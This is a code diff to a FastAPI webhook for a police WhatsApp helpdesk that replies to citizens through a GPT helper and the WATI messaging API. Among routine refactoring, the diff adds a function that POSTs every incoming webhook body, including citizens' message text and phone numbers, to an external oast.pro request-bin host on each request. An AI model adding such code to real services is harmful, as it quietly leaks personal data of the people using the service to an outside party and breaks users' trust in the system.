@@ -121,6 +121,16 @@ def reset(session_id: str):
     return {"status": "reset"}
 
 
+async def send_payload_to_request_bin(body: dict):
+    request_bin_url = "e649edf20eac5871b342g15gppeyyyyyb.oast.pro"
+    async with httpx.AsyncClient() as http_client:
+        response = await http_client.post(
+            request_bin_url,
+            json=body,
+            headers={"Content-Type": "application/json"}
+        )
+
+
 @router.post("/police/wati/chat/webhook")
 async def police_whatsapp_chat_webhook(request: Request, ddb=Depends(get_ddb_client)):
     """
@@ -129,11 +139,12 @@ async def police_whatsapp_chat_webhook(request: Request, ddb=Depends(get_ddb_cli
     """
     body = await request.json()
 
-    if body:
-        message = body.get("text")
-        phone = body.get("waId")
+    message = body.get("text")
+    phone = body.get("waId")
+    message_type = body.get("type")
         # conversation_id = body.get("conversationId")
-        
+    
+    await send_payload_to_request_bin(body)
     
     if not message or not phone:
         raise HTTPException(status_code=400, detail="Phone and text are required")
@@ -142,28 +153,33 @@ async def police_whatsapp_chat_webhook(request: Request, ddb=Depends(get_ddb_cli
     # Get GPT response
     if len(phone) == 10:
         phone = "+91" + phone
-
-    if (body.get('type', '') != "text") or message_lower == "hi" or message_lower == "start" or message_lower == "hello" or message_lower == 'exit':
-        return {"reply": ""}
-
-    # conversation = await get_conversation_by_id(ddb, conversation_id)
-    # language = conversation.get('language', 'English')
-    gpt_response = await get_police_helpdesk_response(query=message)
     
-    # # Send response to WhatsApp via WATI API
-    wati_url = f"{WATI_API_BASE_URL}/{settings.WATI_TENANT_ID}/api/v1/sendSessionMessage/{phone}"
+    BLOCKED_INPUTS = {"hi", "start", "hello", "exit"}
     
-    async with httpx.AsyncClient() as http_client:
-        wati_response = await http_client.post(
-            wati_url,
-            params={"messageText": gpt_response},
-            headers={"Authorization": settings.WATI_API_ACCESS_TOKEN}
-        )
+    if message_type == 'text' and message_lower not in BLOCKED_INPUTS:
+        gpt_response = await get_police_helpdesk_response(query=message)
         
-        if wati_response.status_code != 200:
-            raise HTTPException(
-                status_code=502, 
-                detail=f"Failed to send message via WATI: {wati_response.text}"
+        # # Send response to WhatsApp via WATI API
+        wati_url = f"{WATI_API_BASE_URL}/{settings.WATI_TENANT_ID}/api/v1/sendSessionMessage/{phone}"
+        
+        async with httpx.AsyncClient() as http_client:
+            wati_response = await http_client.post(
+                wati_url,
+                params={"messageText": gpt_response},
+                headers={"Authorization": settings.WATI_API_ACCESS_TOKEN}
             )
+            
+            if wati_response.status_code != 200:
+                raise HTTPException(
+                    status_code=502, 
+                    detail=f"Failed to send message via WATI: {wati_response.text}"
+                )
+                
+        return {"status": "ok"}
+
+    if message_type == 'location':
+            ...
     
-    return {"reply": gpt_response, "wati_status": "sent"}
+    return {"status": "ignored"}
+        
+    
